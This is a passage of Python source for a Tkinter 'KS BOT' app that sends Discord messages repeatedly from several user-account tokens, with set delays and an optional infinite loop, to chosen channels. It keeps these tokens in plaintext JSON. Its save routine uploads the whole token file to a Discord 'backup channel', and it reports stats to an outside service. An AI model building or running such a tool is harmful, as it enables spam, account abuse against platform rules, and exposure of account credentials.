        try:
            self.apply_glow(self.message_entry)
        except Exception:
            pass
        # Ensure row 4 expands vertically with the text box
        left.grid_rowconfigure(4, weight=1)
        
        # Delays bigger, stacked
        delays = tk.Frame(left, bg="#1e1b29")
        delays.grid(row=4, column=1, sticky="ns", padx=6, pady=(6, 0))
        tk.Label(delays, text="Delay (seconds):", anchor="w", bg="#1e1b29", fg="#e0d7ff").pack(fill="x")
        self.delay_entry = tk.Entry(delays, width=24, relief="flat", bg="#2c2750", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.delay_entry.insert(0, "3")
        self.delay_entry.pack(fill="x", pady=(0, 12), ipady=6)
        tk.Label(delays, text="Reply Delay (seconds):", anchor="w", bg="#1e1b29", fg="#e0d7ff").pack(fill="x")
        self.reply_delay_entry = tk.Entry(delays, width=24, relief="flat", bg="#2c2750", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.reply_delay_entry.insert(0, "8")
        self.reply_delay_entry.pack(fill="x", pady=(0, 12), ipady=6)
        tk.Label(delays, text="Loop Count (0 = ∞):", anchor="w", bg="#1e1b29", fg="#e0d7ff").pack(fill="x")
        self.loop_count_entry = tk.Entry(delays, width=24, relief="flat", bg="#2c2750", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.loop_count_entry.insert(0, "1")
        self.loop_count_entry.pack(fill="x", pady=(0, 12), ipady=6)
        try:
            self.apply_glow(self.delay_entry)
            self.apply_glow(self.reply_delay_entry)
            self.apply_glow(self.loop_count_entry)
        except Exception:
            pass

        # Credit box under reply delay (moved slightly further down)
        try:
            credit = tk.Frame(delays, bg="#2c2750")
            credit.pack(fill="x", padx=0, pady=(20, 4))
            self.apply_glow(credit, thickness=2)
            tk.Label(credit, text="KoolaidSippin", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 16, "bold")).pack(padx=12, pady=(8, 2), anchor="w")
            tk.Label(credit, text="Made by", bg="#2c2750", fg="#e0d7ff", font=self.normal_font).pack(padx=12, anchor="w")
            tk.Label(credit, text="Iris&Classical", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 14, "bold")).pack(padx=12, pady=(0, 10), anchor="w")
            # Run buttons moved to middle between rotator and SYS
            run = tk.Frame(left, bg="#1e1b29")
            run.grid(row=5, column=1, sticky="n", padx=(8,8), pady=(36,12))
            self.btn_start = tk.Button(run, text="Start", command=self.start_sending, width=12)
            self.btn_start.pack(fill="x", pady=(0, 6))
            self.btn_pause = tk.Button(run, text="Pause", command=self.pause_resume_sending, width=12)
            self.btn_pause.pack(fill="x", pady=(0, 6))
            self.btn_restart = tk.Button(run, text="Restart", command=lambda: (self._restart_sending()), width=12)
            self.btn_restart.pack(fill="x")
            self._stateful_buttons = getattr(self, '_stateful_buttons', set())
            self._stateful_buttons.update({self.btn_start, self.btn_pause, self.btn_restart})
        except Exception:
            pass

        # Activity Log next to message content (taller)
        self.log_panel = tk.Frame(left, bg="#1e1b29")
        self.log_panel.grid(row=4, column=2, columnspan=2, sticky="nsew", padx=6, pady=(6, 10))
        # eDEX log header is added centrally in _add_edex_terminal_headers()
        self.log_text = tk.Text(self.log_panel, height=12, width=52, state=tk.DISABLED, bg="#120f1f", fg="#e0d7ff", relief="flat")
        self.log_text.pack(fill="both", expand=True)

        # Key Duration live countdown
        keydur_wrap = tk.Frame(left, bg="#1e1b29")
        keydur_wrap.grid(row=6, column=2, columnspan=2, sticky="we", padx=6, pady=(0, 6))
        tk.Label(keydur_wrap, text="Key Duration", bg="#1e1b29", fg="#e0d7ff", font=("Segoe UI", 12, "bold")).pack(anchor="w")
        self.key_duration_value = tk.Label(keydur_wrap, text="—", bg="#1e1b29", fg="#bfaef5", font=("Consolas", 13, "bold"))
        self.key_duration_value.pack(anchor="w")

        # Message counter label (live-updating)
        self.stats_label = tk.Label(left, text=f"Messages sent: {self.message_counter_total}", bg="#1e1b29", fg="#e0d7ff")
        self.stats_label.grid(row=7, column=0, columnspan=4, sticky="w", padx=10, pady=(4, 8))
        # Start duration updater
        try:
            self._start_key_duration_updater()
        except Exception:
            pass

        # Right: Announcements + Community Chat (2500+ required to send)
        ann_panel = tk.Frame(right, bg="#1e1b29")
        ann_panel.pack(fill="x", padx=10, pady=(28, 4))
        tk.Label(ann_panel, text="Announcements", bg="#1e1b29", fg="#e0d7ff", font=("Segoe UI", 11, "bold")).pack(anchor="w")
        self.ann_text = tk.Text(ann_panel, height=5, state=tk.DISABLED, bg="#120f1f", fg="#e0d7ff", relief="flat")
        self.ann_text.pack(fill="x", expand=False)
        try:
            self.apply_glow(self.ann_text)
        except Exception:
            pass
        # Owner-only announcements send area with Message Content bar
        ann_send_section = tk.Frame(ann_panel, bg="#1e1b29")
        ann_send_section.pack(fill="x", padx=0, pady=(6, 2))
        ann_bar = tk.Frame(ann_send_section, bg="#2c2750")
        ann_bar.pack(fill="x")
        try:
            self.apply_glow(ann_bar, thickness=2)
        except Exception:
            pass
        tk.Label(ann_bar, text="Message Content", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=8, pady=(4, 2))
        self.ann_box = tk.Text(ann_send_section, height=3, bg="#0b0b0d", fg="#e0d7ff", insertbackground="#e0d7ff", relief="flat", font=self.normal_font)
        self.ann_box.pack(fill="x", expand=True, padx=(0, 0), pady=(2, 6))
        btn_row = tk.Frame(ann_send_section, bg="#1e1b29")
        btn_row.pack(fill="x")
        self.ann_send_btn = tk.Button(btn_row, text="Send", command=self.ann_send_message, bg="#5a3e99", fg="#f0e9ff", activebackground="#7d5fff", activeforeground="#f0e9ff", relief="flat")
        self.ann_send_btn.pack(side="right")
        header = tk.Label(right, text="Community Chat (2500+ messages required to send)", bg="#1e1b29", fg="#e0d7ff", font=("Segoe UI", 11, "bold"))
        header.pack(anchor="w", padx=10, pady=(6, 4))
        self._chat_canvas = tk.Canvas(right, bg="#1e1b29", highlightthickness=0)
        self._chat_canvas.pack(fill="both", expand=True, padx=10, pady=(0, 8))
        self._chat_bg_items = []
        self._chat_items = []
        self._chat_scroll_y = 0
        self._avatar_cache = {}
        self._avatar_missing = set()
        self._chat_canvas.bind('<Configure>', self._redraw_chat_bg)
        self._chat_canvas.bind_all('<MouseWheel>', lambda e: self._on_chat_scroll(e))
        # Load persisted chat/announcements before drawing
        try:
            self._load_chat_history_local()
        except Exception:
            pass
        self._draw_chat_items()
        self._chat_canvas.bind("<Configure>", self._redraw_chat_bg)
        self._redraw_chat_bg()
        entry_row = tk.Frame(right, bg="#1e1b29")
        entry_row.pack(fill="x", padx=10, pady=(0, 8))
        self.chat_entry = tk.Entry(entry_row, bg="#0b0b0d", fg="#e0d7ff", insertbackground="#e0d7ff", relief="flat", font=self.title_font)
        self.chat_entry.pack(side="left", fill="x", expand=True, padx=(0, 8), ipady=6)
        self.chat_send_btn = tk.Button(entry_row, text="Send", command=self.chat_send_message, bg="#5a3e99", fg="#f0e9ff", activebackground="#7d5fff", activeforeground="#f0e9ff", relief="flat")
        self.chat_send_btn.pack(side="right")
        threading.Thread(target=self.chat_poll_loop, daemon=True).start()
        threading.Thread(target=self.ann_poll_loop, daemon=True).start()
        self._me_user_id = None
        try:
            headers = {"Authorization": self.user_token}
            r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=6)
            if r.status_code == 200:
                u = r.json()
                self._me_user_id = u.get('id')
                # Determine owner role for announcements posting UI
                try:
                    roles = self._get_user_roles(self.user_token, str(self._me_user_id))
                    self._is_owner = str(OWNER_ROLE_ID) in roles
                except Exception:
                    self._is_owner = False
        except Exception:
            self._me_user_id = None
            self._is_owner = False

        # Apply glow to inputs/buttons
        try:
            for w in [self.token_entry, self.channel_entry, self.delay_entry, self.reply_delay_entry, self.message_entry, self.reply_dm_entry, self.chat_entry, self.log_text]:
                self.apply_glow(w)
            # Make all buttons pretty (recursively)
            def _walk(p):
                for c in p.winfo_children():
                    yield c
                    yield from _walk(c)
            for b in [w for w in _walk(self.main_frame) if isinstance(w, tk.Button)]:
                b.configure(bg="#5a3e99", fg="#f0e9ff", activebackground="#7d5fff", activeforeground="#f0e9ff", relief="flat", cursor="hand2")
        except Exception:
            pass

    def _redraw_chat_bg(self, event=None):
        if not hasattr(self, '_chat_canvas'):
            return
        c = self._chat_canvas
        for item in getattr(self, '_chat_bg_items', []):
            try:
                c.delete(item)
            except Exception:
                pass
        self._chat_bg_items = []
        w = c.winfo_width()
        h = c.winfo_height()
        if w <= 0 or h <= 0:
            return
        r = 16
        # Draw rounded rectangle background (black/black border)
        def arc(x0, y0, x1, y1, start, extent):
            self._chat_bg_items.append(c.create_arc(x0, y0, x1, y1, start=start, extent=extent, style='pieslice', outline='', fill='#0b0b0d'))
        def rect(x0, y0, x1, y1):
            self._chat_bg_items.append(c.create_rectangle(x0, y0, x1, y1, outline='', fill='#0b0b0d'))
        # Corners
        arc(0, 0, 2*r, 2*r, 90, 90)
        arc(w-2*r, 0, w, 2*r, 0, 90)
        arc(0, h-2*r, 2*r, h, 180, 90)
        arc(w-2*r, h-2*r, w, h, 270, 90)
        # Edges/center
        rect(r, 0, w-r, h)
        rect(0, r, w, h-r)
        # Border overlay + glow lines
        self._chat_bg_items.append(c.create_rectangle(0, 0, w, h, outline='#000000', width=1))
        # Neon glow effect (inner strokes)
        try:
            glow_colors = ['#7d5fff', '#6a4bbb', '#5a3e99']
            inset = 2
            for col in glow_colors:
                self._chat_bg_items.append(c.create_rectangle(inset, inset, w-inset, h-inset, outline=col, width=1))
                inset += 2
        except Exception:
            pass
        # Update inner window size
        try:
            c.itemconfigure(self._chat_window, width=w, height=h)
        except Exception:
            pass

    # ---- Glow helpers for widgets ----
    def _init_glow_system(self):
        if hasattr(self, '_glow_widgets'):
            return
        self._glow_widgets = []
        self._glow_state = True
        def _tick():
            # Keep steady glow (no visible on/off). We still refresh to apply theme changes safely.
            for w, c1, c2 in list(self._glow_widgets):
                try:
                    w.configure(highlightbackground=c1, highlightcolor=c1)
                except Exception:
                    pass
            self.root.after(1200, _tick)
        self.root.after(1200, _tick)

    def apply_glow(self, widget, color1='#7d5fff', color2=None, thickness=3):
        try:
            if color2 is None:
                color2 = color1
            self._init_glow_system()
            widget.configure(highlightthickness=thickness, highlightbackground=color1, highlightcolor=color1, bd=0, relief='flat')
            # Store identical colors so any background refresher keeps a steady glow
            self._glow_widgets.append((widget, color1, color1))
        except Exception:
            pass

    # -------- Theme/Colors --------
    def apply_theme(self):
        bg_color = "#1e1b29"
        fg_color = "#e0d7ff"
        entry_bg = "#2c2750"
        button_bg = "#5a3e99"
        button_fg = "#f0e9ff"
        log_bg = "#120f1f"
        menu_bg = "#2c2750"
        menu_fg = "#e0d7ff"

        self.root.configure(bg=bg_color)
        self.main_frame.configure(bg=bg_color)
        self.user_info_frame.configure(bg=bg_color)

        for lbl in [w for w in self.main_frame.winfo_children() if isinstance(w, tk.Label)]:
            lbl.configure(bg=bg_color, fg=fg_color, font=self.title_font)

        for w in [self.token_entry, self.channel_entry, self.delay_entry, self.reply_delay_entry,
                  self.message_entry, self.log_text, self.reply_dm_entry]:
            w.configure(bg=entry_bg, fg=fg_color, insertbackground=fg_color, font=self.mono_font)

        for b in [w for w in self.main_frame.winfo_children() if isinstance(w, tk.Button)]:
            b.configure(fg=button_fg, activeforeground=button_fg,
                        relief="flat", font=self.title_font, cursor="hand2", padx=8, pady=6)
            if b not in getattr(self, '_stateful_buttons', set()):
                b.configure(bg=button_bg, activebackground="#7d5fff")
                b.bind("<Enter>", lambda e, btn=b: btn.configure(bg="#6a4bbb"))
                b.bind("<Leave>", lambda e, btn=b: btn.configure(bg=button_bg))

        if hasattr(self, 'token_menu'):
            try:
                self.token_menu.configure(bg=button_bg, fg=button_fg, activebackground="#7d5fff", activeforeground=button_fg,
                                          font=self.title_font)
                self.token_menu["menu"].configure(bg=menu_bg, fg=menu_fg, font=self.normal_font)
            except Exception:
                pass

        self.log_text.configure(bg=log_bg)

        self.username_label.configure(bg=bg_color, fg=fg_color)
        self.avatar_label.configure(bg=bg_color)

    # ===== eDEX-UI THEME ENHANCEMENTS =====
    def _enable_edex_theme(self):
        # Top status bar
        self._edex_bar = tk.Frame(self.root, bg="#0b1020")
        self._edex_bar.place(relx=0.0, rely=0.0, relwidth=1.0, height=36)
        try:
            self.apply_glow(self._edex_bar, thickness=2)
        except Exception:
            pass
        left = tk.Frame(self._edex_bar, bg="#0b1020")
        center = tk.Frame(self._edex_bar, bg="#0b1020")
        right = tk.Frame(self._edex_bar, bg="#0b1020")
        left.pack(side="left", padx=10)
        center.pack(side="left", expand=True)
        right.pack(side="right", padx=10)
        self._edex_title = tk.Label(left, text="KS BOT", bg="#0b1020", fg="#b799ff", font=("Consolas", 12, "bold"))
        self._edex_title.pack(side="left")
        self._edex_clock = tk.Label(center, text="", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 11))
        self._edex_clock.pack()
        uid_txt = (self._login_user_id or "—")
        self._edex_right = tk.Label(right, text=f"User: {uid_txt}  |  Key: —", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 10))
        self._edex_right.pack()
        # Scanlines/grid overlays disabled to reduce visual noise and CPU
        self._edex_scanlines = []
        self._edex_grid_lines = []
        # Start ticker
        self._edex_tick()

    def _add_edex_terminal_headers(self):
        # Add neon headers to key content areas to mimic terminal panes
        try:
            for pane, title in [
                (self.log_panel, "TERMINAL: LOG"),
                (self.main_frame, "KS BOT"),
            ]:
                bar = tk.Frame(pane, bg="#0b1020")
                try:
                    if pane is getattr(self, 'log_panel', None) and hasattr(self, 'log_text'):
                        bar.pack(fill="x", side="top", before=self.log_text)
                    else:
                        bar.pack(fill="x", side="top")
                except Exception:
                    bar.pack(fill="x", side="top")
                try:
                    self.apply_glow(bar, thickness=2)
                except Exception:
                    pass
                tk.Label(bar, text=title, bg="#0b1020", fg="#b799ff", font=("Consolas", 10, "bold")).pack(side="left", padx=8)
                # Status LEDs
                for color in ("#22c55e", "#f59e0b", "#ef4444"):
                    c = tk.Canvas(bar, width=10, height=10, bg="#0b1020", highlightthickness=0)
                    c.pack(side="right", padx=3)
                    c.create_oval(2, 2, 8, 8, fill=color, outline=color)
        except Exception:
            pass

    def _add_edex_bottom_bar(self):
        try:
            self._edex_cmd = tk.Frame(self.root, bg="#0b1020")
            self._edex_cmd.place(relx=0.0, rely=0.965, relwidth=1.0, relheight=0.035)
            try:
                self.apply_glow(self._edex_cmd, thickness=2)
            except Exception:
                pass
            lbl = tk.Label(self._edex_cmd, text="> press F11 to toggle fullscreen • Esc to exit • KS Bot", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 10))
            lbl.pack(side="left", padx=10)
        except Exception:
            pass

    def _add_edex_system_hud(self):
        # Small system HUD box in top-right corner
        try:
            parent = getattr(self, 'log_panel', None)
            if parent is not None:
                parent = parent.master
            else:
                parent = self.root
            self._edex_hud = tk.Frame(parent, bg="#0b1020")
            self._edex_hud.grid(row=5, column=2, columnspan=2, sticky="we", padx=6, pady=(0, 6))
            try:
                self.apply_glow(self._edex_hud, thickness=2)
            except Exception:
                pass
            tk.Label(self._edex_hud, text="SYS", bg="#0b1020", fg="#b799ff", font=("Consolas", 11, "bold")).pack(anchor="w", padx=8, pady=(6,2))
            self._hud_time = tk.Label(self._edex_hud, text="time: —", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 10))
            self._hud_time.pack(anchor="w", padx=8)
            self._hud_msgs = tk.Label(self._edex_hud, text="msgs: 0", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 10))
            self._hud_msgs.pack(anchor="w", padx=8)
            # Credits under SYS (right side)
            try:
                credit = tk.Frame(self._edex_hud, bg="#0b1020")
                credit.pack(anchor="e", padx=8, pady=(6, 4))
                tk.Label(credit, text="KoolaidSippin", bg="#0b1020", fg="#e0d7ff", font=("Segoe UI", 10, "bold")).pack(anchor="e")
                tk.Label(credit, text="Made by Iris&Classical", bg="#0b1020", fg="#e0d7ff", font=("Segoe UI", 9)).pack(anchor="e")
            except Exception:
                pass
            # Gauges
            gwrap = tk.Frame(self._edex_hud, bg="#0b1020")
            gwrap.pack(fill="x", padx=8, pady=(4,6))
            # CPU
            self._cpu_label = tk.Label(gwrap, text="cpu", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 10))
            self._cpu_label.grid(row=0, column=0, sticky="w")
            self._cpu_canvas = tk.Canvas(gwrap, width=120, height=10, bg="#0b1020", highlightthickness=0)
            self._cpu_canvas.grid(row=0, column=1, padx=6)
            self._cpu_bar = self._cpu_canvas.create_rectangle(0, 0, 0, 10, fill="#22c55e", outline="")
            # RAM
            self._ram_label = tk.Label(gwrap, text="ram", bg="#0b1020", fg="#9ab0ff", font=("Consolas", 10))
            self._ram_label.grid(row=1, column=0, sticky="w")
            self._ram_canvas = tk.Canvas(gwrap, width=120, height=10, bg="#0b1020", highlightthickness=0)
            self._ram_canvas.grid(row=1, column=1, padx=6)
            self._ram_bar = self._ram_canvas.create_rectangle(0, 0, 0, 10, fill="#f59e0b", outline="")
        except Exception:
            pass

    def _create_scanlines(self):
        try:
            h = self.bg_canvas.winfo_height() or 700
            w = self.bg_canvas.winfo_width() or 900
            step = 6
            for y in range(0, h, step):
                line = self.bg_canvas.create_line(0, y, w, y, fill="#000000", stipple="gray25")
                self._edex_scanlines.append(line)
        except Exception:
            pass

    def _create_grid(self):
        try:
            h = self.bg_canvas.winfo_height() or 700
            w = self.bg_canvas.winfo_width() or 900
            gap = 48
            color = "#1c2b5b"
            for x in range(0, w + gap, gap):
                self._edex_grid_lines.append(self.bg_canvas.create_line(x, 0, x, h, fill=color))
            for y in range(0, h + gap, gap):
                self._edex_grid_lines.append(self.bg_canvas.create_line(0, y, w, y, fill=color))
        except Exception:
            pass

    def _edex_tick(self):
        # Update clock
        try:
            try:
                from zoneinfo import ZoneInfo  # Python 3.9+
                now_est = datetime.now(ZoneInfo("America/New_York"))
            except Exception:
                try:
                    import pytz  # fallback if available
                    now_est = datetime.now(pytz.timezone("America/New_York"))
                except Exception:
                    now_est = datetime.fromtimestamp(time.time())
            self._edex_clock.config(text=now_est.strftime("%Y-%m-%d %H:%M:%S EST"))
        except Exception:
            pass
        # Update right status with key remaining if available
        try:
            remaining_txt = self.key_duration_value.cget("text") if hasattr(self, "key_duration_value") else "—"
            uid_txt = (self._login_user_id or "—")
            self._edex_right.config(text=f"User: {uid_txt}  |  Key: {remaining_txt}")
        except Exception:
            pass
        # Subtle grid pulse
        try:
            for i, line in enumerate(self._edex_grid_lines):
                if i % 3 == 0:
                    self.bg_canvas.itemconfigure(line, fill="#243a7a")
                elif i % 3 == 1:
                    self.bg_canvas.itemconfigure(line, fill="#1c2b5b")
                else:
                    self.bg_canvas.itemconfigure(line, fill="#16234a")
        except Exception:
            pass
        # HUD updates
        try:
            self._hud_time.config(text=f"time: {time.strftime('%H:%M:%S')}" )
            self._hud_msgs.config(text=f"msgs: {self.message_counter_total}")
            # Gauges
            cpu_p = 0
            ram_p = 0
            if _HAS_PSUTIL:
                try:
                    cpu_p = int(psutil.cpu_percent(interval=None))
                except Exception:
                    cpu_p = 0
                try:
                    vm = psutil.virtual_memory()
                    ram_p = int(vm.percent)
                except Exception:
                    ram_p = 0
            else:
                # Fallback: simple animation pulse
                t = int(time.time() * 2) % 100
                cpu_p = t
                ram_p = (t * 7) % 100
            # Draw bars
            def _set_bar(canvas, bar, percent, color_ok="#22c55e", color_mid="#f59e0b", color_hi="#ef4444"):
                try:
                    width = int(canvas.winfo_width() or 120)
                    val = max(0, min(100, int(percent)))
                    x = int(width * val / 100)
                    col = color_ok if val < 60 else color_mid if val < 85 else color_hi
                    canvas.itemconfigure(bar, fill=col)
                    canvas.coords(bar, 0, 0, x, 10)
                except Exception:
                    pass
            _set_bar(self._cpu_canvas, self._cpu_bar, cpu_p)
            _set_bar(self._ram_canvas, self._ram_bar, ram_p)
        except Exception:
            pass
        # Re-schedule
        try:
            self.root.after(500, self._edex_tick)
        except Exception:
            pass

    # -------- Token & Channel Save/Load --------
    def save_token(self):
        token = self.token_entry.get().strip()
        if not token:
            self.log("❌ Token cannot be empty.")
            return
        name = simpledialog.askstring("Token Name", "Enter a name for this token:")
        if not name:
            self.log("❌ Token name cannot be empty.")
            return
        self.tokens[name] = token
        self.save_data()
        self.update_token_menu()
        self.token_var.set(name)
        self.log(f"✅ Token '{name}' saved.")

    def save_channel(self):
        channel_id = self.channel_entry.get().strip()
        if not channel_id:
            self.log("❌ Channel ID cannot be empty.")
            return
        name = simpledialog.askstring("Channel Name", "Enter a name for this channel:")
        if not name:
            self.log("❌ Channel name cannot be empty.")
            return
        self.channels[name] = channel_id
        self.save_data()
        self.update_channel_checkboxes()
        self.log(f"✅ Channel '{name}' saved.")

    def update_token_menu(self):
        # If current selection missing, clear user info
        if self.token_var.get() not in self.tokens:
            self.token_var.set("")
            self.clear_user_info()
        # Ensure multi-token state exists and sync keys
        if not hasattr(self, 'multi_token_vars'):
            self.multi_token_vars = {}
        # Preserve existing selections where possible
        existing = {k: v.get() for k, v in self.multi_token_vars.items()}
        self.multi_token_vars = {}
        for name in sorted(self.tokens.keys()):
            val = existing.get(name, False)
            self.multi_token_vars[name] = tk.BooleanVar(value=val)
        # Rebuild any mirrored views safely
        try:
            self._rebuild_side_tokens()
        except Exception:
            pass

    def _rebuild_side_tokens(self):
        try:
            # Mirror left multi_token_vars into the side token box
            for w in list(getattr(self, 'multi_tokens_side_frame', tk.Frame()).winfo_children()):
                w.destroy()
            for name, var in getattr(self, 'multi_token_vars', {}).items():
                sv = tk.BooleanVar(value=var.get())
                def _bind_toggle(v=var, sv=sv):
                    v.set(sv.get())
                    # Also refresh avatar strip when selection changes
                    try:
                        self._refresh_selected_avatars()
                    except Exception:
                        pass
                cb = tk.Checkbutton(self.multi_tokens_side_frame, text=name, variable=sv,
                                    bg="#2c2750", fg="#e0d7ff", selectcolor="#5a3e99",
                                    activebackground="#2c2750", activeforeground="#e0d7ff",
                                    command=_bind_toggle)
                cb.pack(anchor='w')
        except Exception:
            pass

    def _refresh_selected_avatars(self):
        # Rebuild the avatar strip for selected tokens (up to 3)
        try:
            for w in list(self.avatar_strip.winfo_children()):
                w.destroy()
            self._selected_avatar_photos = []
            count = 0
            for name, var in getattr(self, 'multi_token_vars', {}).items():
                if var.get():
                    tok = self.tokens.get(name)
                    if not tok:
                        continue
                    try:
                        headers = {"Authorization": tok}
                        r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=6)
                        if r.status_code != 200:
                            continue
                        u = r.json()
                        avatar_hash = u.get("avatar")
                        uid = u.get("id")
                        if avatar_hash:
                            ext = "gif" if avatar_hash.startswith("a_") else "png"
                            aurl = f"https://cdn.discordapp.com/avatars/{uid}/{avatar_hash}.{ext}?size=64"
                        else:
                            disc = str(u.get('discriminator','0'))
                            mod = int(disc) % 5 if disc.isdigit() else 0
                            aurl = f"https://cdn.discordapp.com/embed/avatars/{mod}.png"
                        rr = requests.get(aurl, timeout=8)
                        if rr.status_code == 200:
                            from PIL import Image
                            import io as _io
                            img = Image.open(_io.BytesIO(rr.content)).resize((28,28))
                            ph = ImageTk.PhotoImage(img)
                            self._selected_avatar_photos.append(ph)
                            tk.Label(self.avatar_strip, image=ph, bg="#1e1b29").pack(side='left', padx=(0,4))
                            count += 1
                            if count >= 3:
                                break
                    except Exception:
                        continue
        except Exception:
            pass

    def update_channel_checkboxes(self):
        # Clear old checkboxes
        for widget in self.channels_frame.winfo_children():
            widget.destroy()
        self.channel_vars.clear()

        row = 0
        col = 0
        for name in sorted(self.channels.keys()):
            var = tk.BooleanVar()
            label_text = f"{name}  (ID: {self.channels.get(name, '')})"
            cb = tk.Checkbutton(self.channels_frame, text=label_text, variable=var, font=self.normal_font,
                                bg="#1e1b29", fg="#e0d7ff", selectcolor="#5a3e99", activebackground="#2c2750",
                                activeforeground="#e0d7ff", cursor="hand2")
            cb.grid(row=row, column=col, sticky="w", padx=5, pady=2)
            self.channel_vars[name] = var
            col += 1
            if col >= 2:
                col = 0
                row += 1

    def load_data(self):
        if os.path.exists(self.TOKENS_FILE):
            try:
                with open(self.TOKENS_FILE, "r") as f:
                    self.tokens = json.load(f)
            except Exception as e:
                self.log(f"❌ Failed to load tokens: {e}")
        if os.path.exists(self.CHANNELS_FILE):
            try:
                with open(self.CHANNELS_FILE, "r") as f:
                    self.channels = json.load(f)
            except Exception as e:
                self.log(f"❌ Failed to load channels: {e}")

        self.update_token_menu()
        self.update_channel_checkboxes()

    def save_data(self):
        try:
            with open(self.TOKENS_FILE, "w") as f:
                json.dump(self.tokens, f, indent=2)
            with open(self.CHANNELS_FILE, "w") as f:
                json.dump(self.channels, f, indent=2)
            # Push backup to Discord channel if configured
            if getattr(self, 'backup_channel_id', '') and getattr(self, 'user_token', ''):
                try:
                    self.upload_discord_backup()
                except Exception as be:
                    self.log(f"Backup upload failed: {be}")
        except Exception as e:
            self.log(f"❌ Error saving data: {e}")

    # -------- Message Stats (load/save/increment) --------
    def load_stats(self):
        try:
            if os.path.exists(self.STATS_FILE):
                with open(self.STATS_FILE, 'r') as f:
                    data = json.load(f)
                self.message_counter_total = int(data.get('total', 0) or 0)
                self.message_counts_by_user = dict(data.get('by_user', {}))
                self.message_counts_by_role = dict(data.get('by_role', {}))
            self._update_stats_label()
        except Exception as e:
            self.log(f"❌ Failed to load stats: {e}")

    def save_stats(self):
        try:
            with open(self.STATS_FILE, 'w') as f:
                json.dump({
                    'total': self.message_counter_total,
                    'by_user': self.message_counts_by_user,
                    'by_role': self.message_counts_by_role,
                }, f, indent=2)
        except Exception as e:
            self.log(f"❌ Failed to save stats: {e}")

    def _update_stats_label(self):
        try:
            if hasattr(self, 'stats_label'):
                self.stats_label.config(text=f"Messages sent: {self.message_counter_total}")
        except Exception:
            pass

    def _get_user_id_for_token(self, token: str) -> str | None:
        if token in self._user_id_cache:
            return self._user_id_cache[token]
        try:
            r = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": token}, timeout=8)
            if r.status_code == 200:
                uid = str(r.json().get('id', ''))
                self._user_id_cache[token] = uid
                return uid
        except Exception:
            return None
        return None

    def _get_user_roles(self, token: str, user_id: str) -> list[str]:
        if user_id in self._roles_cache:
            return self._roles_cache[user_id]
        roles: list[str] = []
        try:
            url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{user_id}"
            r = requests.get(url, headers={"Authorization": token}, timeout=10)
            if r.status_code == 200:
                j = r.json() or {}
                roles = [str(x) for x in (j.get('roles') or [])]
        except Exception:
            roles = []
        self._roles_cache[user_id] = roles
        return roles

    def _resolve_me_user(self, token: str) -> tuple[str, str, str]:
        """Return (user_id, username#discrim, avatar_url) for the token, or ('','','') on failure."""
        try:
            r = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": token}, timeout=6)
            if r.status_code != 200:
                return '', '', ''
            u = r.json() or {}
            uid = str(u.get('id',''))
            username = f"{u.get('username','')}#{u.get('discriminator','')}"
            avatar_hash = u.get("avatar")
            if avatar_hash:
                ext = "gif" if avatar_hash.startswith("a_") else "png"
                avatar_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar_hash}.{ext}?size=64"
            else:
                disc = str(u.get('discriminator','0'))
                mod = int(disc) % 5 if disc.isdigit() else 0
                avatar_url = f"https://cdn.discordapp.com/embed/avatars/{mod}.png"
            return uid, username, avatar_url
        except Exception:
            return '', '', ''

    def increment_message_stats(self, token: str):
        try:
            self.message_counter_total += 1
            uid = self._get_user_id_for_token(token) or 'unknown'
            self.message_counts_by_user[uid] = int(self.message_counts_by_user.get(uid, 0)) + 1
            for rid in self._get_user_roles(token, uid):
                self.message_counts_by_role[rid] = int(self.message_counts_by_role.get(rid, 0)) + 1
            self.save_stats()
            self._update_stats_label()
            # Also report to central bot for global leaderboard
            try:
                if uid and uid != 'unknown':
                    requests.post(f"{SERVICE_URL}/api/stat-incr", data={"user_id": uid}, timeout=5)
            except Exception:
                pass
        except Exception as e:
            self.log(f"❌ Failed to update stats: {e}")

    def show_leaderboard(self):
        try:
            # Top 10 users by count
            items = sorted(self.message_counts_by_user.items(), key=lambda kv: kv[1], reverse=True)[:10]
            self.chat_list.insert('end', "=== /leaderboard (Top senders) ===")
            rank = 1
            for uid, cnt in items:
                self.chat_list.insert('end', f"{rank}. {uid}: {cnt}")
                rank += 1
            self.chat_list.yview_moveto(1)
        except Exception as e:
            self.log(f"❌ Failed to show leaderboard: {e}")

    def _discord_request(self, method: str, url: str, **kwargs):
        headers = kwargs.pop('headers', {}) or {}
        headers.update({
            "Authorization": self.user_token,
            # Minimal headers; Discord accepts user token for self endpoints
        })
        resp = requests.request(method, url, headers=headers, timeout=15, **kwargs)
        # If token invalidated (401/403), prompt for new token and retry once
        if resp.status_code in (401, 403):
            try:
                new_tok = simpledialog.askstring("Token Required", "Your Discord token is invalid or expired. Enter a new token:")
                if new_tok:
                    self.user_token = new_tok.strip()
                    try:
                        # Persist into current token selection if exists
                        if self.selected_token_name:
                            self.tokens[self.selected_token_name] = self.user_token
                            self.save_data()
                    except Exception:
                        pass
                    headers["Authorization"] = self.user_token
                    resp = requests.request(method, url, headers=headers, timeout=15, **kwargs)
                    # Refresh UI user info
                    try:
                        threading.Thread(target=self.fetch_and_display_user_info, args=(self.user_token,), daemon=True).start()
                    except Exception:
                        pass
                    # Recheck member status and report
                    try:
                        uid_chk = str(self._login_user_id or self.user_id or '')
                        if uid_chk:
                            st = self.check_member_status_via_api(uid_chk)
                            if bool(st.get("ok")):
                                self.log("✅ Token updated. Membership status rechecked.")
                            else:
                                self.log("⚠️ Token updated, but membership check failed.")
                    except Exception:
                        pass
            except Exception:
                pass
        return resp

    def upload_discord_backup(self):
        """Upload tokens.json and channels.json to the configured backup channel as attachments."""
        try:
